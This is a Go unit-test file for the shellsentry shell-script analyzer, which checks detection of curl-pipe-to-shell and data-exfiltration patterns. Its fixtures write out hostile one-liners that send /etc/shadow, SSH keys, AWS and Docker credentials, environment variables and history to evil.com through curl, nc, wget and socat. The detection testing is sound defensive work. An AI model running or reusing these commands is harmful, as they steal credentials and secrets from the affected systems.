// Package analyzer provides the core analysis engine for shellsentry.
//
// Copyright 2025 3 Leaps, LLC
// Licensed under the Apache License, Version 2.0

package analyzer

import (
	"context"
	"testing"

	"github.com/3leaps/shellsentry/internal/types"
)

func TestLevel0Analyzer_Name(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	if analyzer.Name() != "level0-ast" {
		t.Errorf("unexpected name: %s", analyzer.Name())
	}
}

func TestLevel0Analyzer_CurlPipeBash(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	// Script with curl piped to bash
	script := `#!/bin/bash
curl -fsSL https://example.com/install.sh | bash
`
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should find SS001
	var foundSS001 bool
	for _, f := range findings {
		if f.ID == "SS001" {
			foundSS001 = true
			if f.Severity != types.SeverityHigh {
				t.Errorf("SS001 should be high severity, got %s", f.Severity)
			}
			if f.Category != types.CategoryExecution {
				t.Errorf("SS001 should be execution category, got %s", f.Category)
			}
			break
		}
	}

	if !foundSS001 {
		t.Error("expected to find SS001 for curl|bash pattern")
	}
}

func TestLevel0Analyzer_WgetPipeSh(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	script := `#!/bin/sh
wget -qO- https://example.com/script.sh | sh
`
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should find SS001
	var foundSS001 bool
	for _, f := range findings {
		if f.ID == "SS001" {
			foundSS001 = true
			break
		}
	}

	if !foundSS001 {
		t.Error("expected to find SS001 for wget|sh pattern")
	}
}

func TestLevel0Analyzer_CurlToPython(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	script := `#!/bin/bash
curl https://bootstrap.pypa.io/get-pip.py | python3
`
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should find SS001 (python is also in shellCommands)
	var foundSS001 bool
	for _, f := range findings {
		if f.ID == "SS001" {
			foundSS001 = true
			break
		}
	}

	if !foundSS001 {
		t.Error("expected to find SS001 for curl|python pattern")
	}
}

func TestLevel0Analyzer_SafePipeline(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	// Safe pipeline: curl piped to grep (not a shell)
	script := `#!/bin/bash
curl https://example.com/data.txt | grep pattern
`
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should NOT find SS001
	for _, f := range findings {
		if f.ID == "SS001" {
			t.Error("should not flag curl|grep as SS001")
		}
	}
}

func TestLevel0Analyzer_CurlToFile(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	// Safe: curl saving to file (not a pipeline to shell)
	script := `#!/bin/bash
curl -fsSL https://example.com/script.sh -o script.sh
`
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should NOT find SS001 (no pipeline)
	for _, f := range findings {
		if f.ID == "SS001" {
			t.Error("should not flag curl with -o as SS001")
		}
	}
}

func TestLevel0Analyzer_DataExfiltration(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	script := `#!/bin/bash
cat /etc/passwd | curl -X POST -d @- https://evil.com/collect
`
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should find SS030 (exfiltration)
	var foundSS030 bool
	for _, f := range findings {
		if f.ID == "SS030" {
			foundSS030 = true
			if f.Severity != types.SeverityHigh {
				t.Errorf("SS030 should be high severity, got %s", f.Severity)
			}
			if f.Category != types.CategoryExfiltration {
				t.Errorf("SS030 should be exfiltration category, got %s", f.Category)
			}
			break
		}
	}

	if !foundSS030 {
		t.Error("expected to find SS030 for cat /etc/passwd | curl pattern")
	}
}

func TestLevel0Analyzer_SSHKeyExfiltration(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	script := `#!/bin/bash
cat ~/.ssh/id_rsa | nc evil.com 4444
`
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should find SS030 (exfiltration)
	var foundSS030 bool
	for _, f := range findings {
		if f.ID == "SS030" {
			foundSS030 = true
			break
		}
	}

	if !foundSS030 {
		t.Error("expected to find SS030 for cat ssh key | nc pattern")
	}
}

func TestLevel0Analyzer_SafeCatPipe(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	// Safe: cat to grep (not exfiltration)
	script := `#!/bin/bash
cat /var/log/app.log | grep ERROR
`
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should NOT find SS030
	for _, f := range findings {
		if f.ID == "SS030" {
			t.Error("should not flag cat log | grep as exfiltration")
		}
	}
}

func TestLevel0Analyzer_EnvExfiltration(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	testCases := []struct {
		name    string
		script  string
		wantHit bool
	}{
		{
			name: "env piped to curl",
			script: `#!/bin/bash
env | curl -X POST -d @- https://collector.example.com
`,
			wantHit: true,
		},
		{
			name: "printenv piped to nc",
			script: `#!/bin/bash
printenv | nc evil.com 4444
`,
			wantHit: true,
		},
		{
			name: "set piped to wget",
			script: `#!/bin/bash
set | wget --post-file=- https://evil.com
`,
			wantHit: true,
		},
		{
			name: "history piped to curl",
			script: `#!/bin/bash
history | curl -d @- https://evil.com
`,
			wantHit: true,
		},
		{
			name: "env piped to grep - safe",
			script: `#!/bin/bash
env | grep PATH
`,
			wantHit: false,
		},
		{
			name: "printenv single var - safe",
			script: `#!/bin/bash
printenv HOME
`,
			wantHit: false,
		},
		{
			name: "cat aws credentials to curl",
			script: `#!/bin/bash
cat ~/.aws/credentials | curl -d @- https://evil.com
`,
			wantHit: true,
		},
		{
			name: "cat docker config to nc",
			script: `#!/bin/bash
cat ~/.docker/config.json | nc evil.com 1234
`,
			wantHit: true,
		},
		{
			name: "cat proc environ to curl",
			script: `#!/bin/bash
cat /proc/self/environ | curl -d @- https://evil.com
`,
			wantHit: true,
		},
		// E011: tar as data source
		{
			name: "tar gnupg to nc",
			script: `#!/bin/bash
tar czf - ~/.gnupg | nc evil.com 80
`,
			wantHit: true,
		},
		{
			name: "tar ssh to curl",
			script: `#!/bin/bash
tar -czf - ~/.ssh | curl -d @- https://evil.com
`,
			wantHit: true,
		},
		{
			name: "tar aws to socat",
			script: `#!/bin/bash
tar cf - ~/.aws | socat - tcp:evil.com:443
`,
			wantHit: true,
		},
		{
			name: "tar to file - safe",
			script: `#!/bin/bash
tar czf backup.tar.gz ~/.config
`,
			wantHit: false,
		},
		{
			name: "tar pipe to gzip - safe",
			script: `#!/bin/bash
tar cf - /some/dir | gzip > backup.tar.gz
`,
			wantHit: false,
		},
		// E006: wget POST exfiltration
		{
			name: "env to wget post-file",
			script: `#!/bin/bash
env | wget --post-file=- https://evil.com
`,
			wantHit: true,
		},
		{
			name: "cat shadow to wget post-data",
			script: `#!/bin/bash
cat /etc/shadow | wget --post-data=@- https://evil.com
`,
			wantHit: true,
		},
		{
			name: "wget download - safe",
			script: `#!/bin/bash
wget https://example.com/file.txt
`,
			wantHit: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			findings, err := analyzer.Analyze(context.Background(), []byte(tc.script), "test.sh")
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			var foundSS030 bool
			for _, f := range findings {
				if f.ID == "SS030" {
					foundSS030 = true
					break
				}
			}

			if foundSS030 != tc.wantHit {
				if tc.wantHit {
					t.Error("expected SS030 exfiltration finding, but didn't get one")
				} else {
					t.Error("got SS030 finding, but shouldn't have")
				}
			}
		})
	}
}

func TestLevel0Analyzer_ParseError(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	// Invalid script with parse error
	script := `#!/bin/bash
echo "unclosed string
`
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")

	// Should still work (may return partial results)
	if err == nil {
		t.Log("parse error was handled gracefully")
	}

	// Should have SS000 (parse error finding)
	var foundSS000 bool
	for _, f := range findings {
		if f.ID == "SS000" {
			foundSS000 = true
			break
		}
	}

	if !foundSS000 {
		t.Error("expected SS000 finding for parse error")
	}
}

func TestLevel0Analyzer_EmptyScript(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	script := ``
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "empty.sh")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(findings) != 0 {
		t.Errorf("expected no findings for empty script, got %d", len(findings))
	}
}

func TestLevel0Analyzer_ComplexScript(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	// More complex script with multiple patterns
	script := `#!/bin/bash
set -euo pipefail

# Download installer
if command -v curl &> /dev/null; then
    curl -fsSL https://example.com/install.sh | bash
else
    wget -qO- https://example.com/install.sh | sh
fi

# Normal pipeline (safe)
cat /var/log/app.log | grep ERROR | wc -l

echo "Done"
`
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should find 2 SS001 findings (curl|bash and wget|sh)
	ss001Count := 0
	for _, f := range findings {
		if f.ID == "SS001" {
			ss001Count++
		}
	}

	if ss001Count != 2 {
		t.Errorf("expected 2 SS001 findings, got %d", ss001Count)
	}
}
